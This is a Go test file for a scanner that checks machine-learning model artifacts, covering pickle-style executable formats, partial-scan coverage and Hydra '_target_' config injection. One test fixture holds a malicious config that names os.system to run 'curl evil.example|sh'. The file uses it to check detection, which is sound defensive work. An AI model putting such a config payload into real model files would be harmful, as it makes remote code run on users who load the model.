package inspector

import (
	securityv1alpha1 "github.com/DAVANO-INNOVATION-LAB/assay/api/v1alpha1"
	"os"
	"path/filepath"
	"testing"
)

// MITRE ATLAS AML.T0076 ("Corrupt AI Model") is the technique of deliberately
// corrupting an artifact so a scanner cannot parse it and moves on, while the
// file still executes when loaded. A scanner that reports every parse failure
// at Low severity is defeated by it, because the policy engine approves Low.
//
// So the severity of "could not examine this" has to depend on what the file
// is. A broken README is a footnote; a pickle we could not read is not.
func TestUnreadableExecutableFormatIsHighSeverity(t *testing.T) {
	cases := []struct {
		file     string
		wantHigh bool
	}{
		{"pytorch_model.bin", true},
		{"weights.pkl", true},
		{"model.pt", true},
		{"checkpoint.ckpt", true},
		{"model.h5", true},
		{"README.md", false},
		{"config.json", false},
		{"model.safetensors", false}, // cannot execute on load
	}

	for _, tc := range cases {
		t.Run(tc.file, func(t *testing.T) {
			f := unreadable("ASSAY-IO-002", "Inspection error", tc.file, "truncated")
			isHigh := f.Severity == "High"
			if isHigh != tc.wantHigh {
				t.Fatalf("%s: severity %q, wanted high=%v. An unexaminable file that "+
					"executes on load must not be reported at a severity the policy "+
					"engine approves.", tc.file, f.Severity, tc.wantHigh)
			}
		})
	}
}

func TestUnreadableExecutableNamesTheTechnique(t *testing.T) {
	f := unreadable("ASSAY-IO-002", "Inspection error", "model.pkl", "bad opcode")
	if f.Severity != "High" {
		t.Fatal("a pickle that could not be parsed must be High")
	}
	// The description should tell a responder why this matters, not just that
	// a parse failed.
	if !contains(f.Description, "AML.T0076") {
		t.Errorf("the finding should name the evasion technique, got %q", f.Description)
	}
	if !contains(f.Description, "executes code") {
		t.Errorf("the finding should say why the format matters, got %q", f.Description)
	}
}

// A walk that hit the file cap examined only part of the artifact. Reporting
// nothing about the rest reads as "nothing found there".
func TestTruncatedWalkProducesAFinding(t *testing.T) {
	dir := t.TempDir()
	for i := 0; i < 12; i++ {
		p := filepath.Join(dir, "f"+string(rune('a'+i))+".txt")
		if err := os.WriteFile(p, []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	limits := DefaultLimits()
	limits.MaxFiles = 5

	report, err := Inspect(dir, limits)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Truncated {
		t.Fatal("the report should record that the walk was truncated")
	}

	var found bool
	for _, f := range report.Findings {
		if f.ID == "ASSAY-COVERAGE-001" {
			found = true
			if f.Severity != "High" {
				t.Errorf("a partial scan should be High, got %s", f.Severity)
			}
		}
	}
	if !found {
		t.Fatal("a truncated scan must emit ASSAY-COVERAGE-001, or a partial scan " +
			"is indistinguishable from a complete one")
	}
}

func TestCompleteWalkIsNotFlagged(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "config.json"), []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := Inspect(dir, DefaultLimits())
	if err != nil {
		t.Fatal(err)
	}
	if report.Truncated {
		t.Fatal("a complete walk must not report truncation")
	}
	for _, f := range report.Findings {
		if f.ID == "ASSAY-COVERAGE-001" {
			t.Fatal("a complete scan must not claim a coverage gap")
		}
	}
}

func TestExecutesOnLoadClassification(t *testing.T) {
	executable := []string{"a.pkl", "a.pickle", "a.joblib", "a.dill", "a.pt", "a.pth",
		"a.ckpt", "a.bin", "a.h5", "a.keras", "a.pb", "a.npy", "a.npz", "a.msgpack"}
	for _, f := range executable {
		if !executesOnLoad(f) {
			t.Errorf("%s executes code on load and must be classified as such", f)
		}
	}
	// ONNX resolves custom operator domains to native libraries, and a GGUF
	// chat template is rendered by a Jinja engine (CVE-2024-34359). Neither is
	// pickle-style deserialization, but an unreadable one is not a footnote.
	for _, f := range []string{"a.onnx", "a.gguf"} {
		if !executesOnLoad(f) {
			t.Errorf("%s has a documented load-time code path and must not be treated "+
				"as inert when it cannot be parsed", f)
		}
	}

	// safetensors exists precisely because it has no such path. Treating it as
	// executable would produce noise on the format we want people using.
	for _, f := range []string{"a.safetensors", "a.json", "a.txt", "a.md"} {
		if executesOnLoad(f) {
			t.Errorf("%s does not execute code on load", f)
		}
	}
}

func contains(haystack, needle string) bool {
	return len(haystack) >= len(needle) && indexOf(haystack, needle) >= 0
}

func indexOf(h, n string) int {
	for i := 0; i+len(n) <= len(h); i++ {
		if h[i:i+len(n)] == n {
			return i
		}
	}
	return -1
}

// A model can ship weights that genuinely cannot execute anything and still
// achieve code execution through its config, because a Hydra-style loader
// imports whatever _target_ names and calls it before any weight is read.
// CVE-2025-23304 (NVIDIA NeMo) and CVE-2026-22584 (Salesforce Uni2TS, which
// ships safetensors) are this class.
func TestHydraTargetInConfigIsDetected(t *testing.T) {
	dir := t.TempDir()
	cfg := `{
	  "architectures": ["LlamaForCausalLM"],
	  "model_type": "llama",
	  "preprocessor": {"_target_": "os.system", "args": ["curl evil.example|sh"]}
	}`
	if err := os.WriteFile(filepath.Join(dir, "config.json"), []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}
	// Weights that cannot execute anything, to prove the config is the payload.
	if err := os.WriteFile(filepath.Join(dir, "model.safetensors"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}

	report, err := Inspect(dir, DefaultLimits())
	if err != nil {
		t.Fatal(err)
	}

	var found *securityv1alpha1.Finding
	for i := range report.Findings {
		if report.Findings[i].ID == "ASSAY-CONFIG-001" {
			found = &report.Findings[i]
		}
	}
	if found == nil {
		t.Fatalf("a _target_ naming os.system must be detected; got %v", findingIDs(report))
	}
	if found.Severity != "Critical" {
		t.Errorf("os.system as an instantiation target is Critical, got %s", found.Severity)
	}
	// The location has to name where in the config it was, or a reviewer has
	// to grep a nested document by hand.
	if !contains(found.Location, "preprocessor") {
		t.Errorf("the finding should locate the key, got %q", found.Location)
	}
}

// A target pointing at the model's own framework is how these loaders are
// meant to work. Rating it Critical would fire on a large share of legitimate
// configs, and a scanner that alarms on the ordinary case gets switched off.
func TestOrdinaryTargetIsNotCritical(t *testing.T) {
	dir := t.TempDir()
	cfg := `{"scheduler": {"_target_": "diffusers.schedulers.DDIMScheduler"}}`
	os.WriteFile(filepath.Join(dir, "config.json"), []byte(cfg), 0o644)
	os.WriteFile(filepath.Join(dir, "model.safetensors"), []byte("x"), 0o644)

	report, err := Inspect(dir, DefaultLimits())
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.ID == "ASSAY-CONFIG-001" {
			if f.Severity == "Critical" {
				t.Fatal("a framework class is the normal case and must not be Critical")
			}
			return
		}
	}
	t.Fatal("it should still be reported — it does execute on load")
}

func TestConfigWithoutTargetsIsClean(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "config.json"),
		[]byte(`{"architectures":["BertModel"],"hidden_size":768}`), 0o644)
	os.WriteFile(filepath.Join(dir, "model.safetensors"), []byte("x"), 0o644)

	report, err := Inspect(dir, DefaultLimits())
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.ID == "ASSAY-CONFIG-001" {
			t.Fatalf("an ordinary config must not be flagged: %+v", f)
		}
	}
}
